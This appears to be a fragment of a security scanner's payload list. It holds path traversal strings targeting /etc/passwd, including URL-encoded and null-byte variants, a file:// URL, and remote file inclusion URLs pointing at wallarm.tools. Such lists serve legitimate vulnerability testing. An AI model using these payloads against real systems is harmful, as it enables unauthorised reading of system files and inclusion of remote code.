    - /etc/passwd
    - /%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd/
    - /../../../../../../../../../etc/passwd
    - /../../../../../../../../../etc/passwd%00
    - /../../../../../../../../../etc/passwd\u0000
    - 'http://wallarm.tools/rfi'
    - 'http://wallarm.tools/rfi.php'
    - 'http://wallarm.tools/rfi_location.php'
    - 'file:///etc/passwd'
